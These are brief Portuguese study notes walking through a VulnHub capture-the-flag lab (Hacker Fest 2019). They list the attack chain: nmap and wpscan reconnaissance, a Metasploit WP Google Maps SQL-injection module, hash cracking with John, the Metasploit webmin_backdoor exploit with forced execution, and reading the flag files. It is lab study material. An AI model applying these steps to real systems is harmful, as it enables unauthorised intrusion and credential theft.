desafio 1 - https://www.vulnhub.com/entry/hacker-fest-2019,378/

  
Dia 1 - desafio 2(1° desafio)
        *scan com nmap        
        *identificação do wordpress -> wpscan -> pesquisar por exploit dos plugins -> wp_google
        *msfconsole -> auxiliary/admin/http/wp_google_maps_sqli
        *quebrar a hash da senha com John 
                john arquivo_com_hash.txt --wordlist=rockyou.txt
        *searchsploit webmin(etapa 1 com nmap - serviço porta 10000)
                *msfconsole -> search webmin
                *use exploit/linux/http/webmin_backdoor  
                *Set ForceExploit true -> versão do exploit é diferente do seviço, força a execução mesmo assim
                *set ssl true -> não sei pq, talvez seja obrigatório "uso do ssl" 
                *find /root
                        cat flag.txt
                *find /home
                        cat /home/webmaster/flag.txt
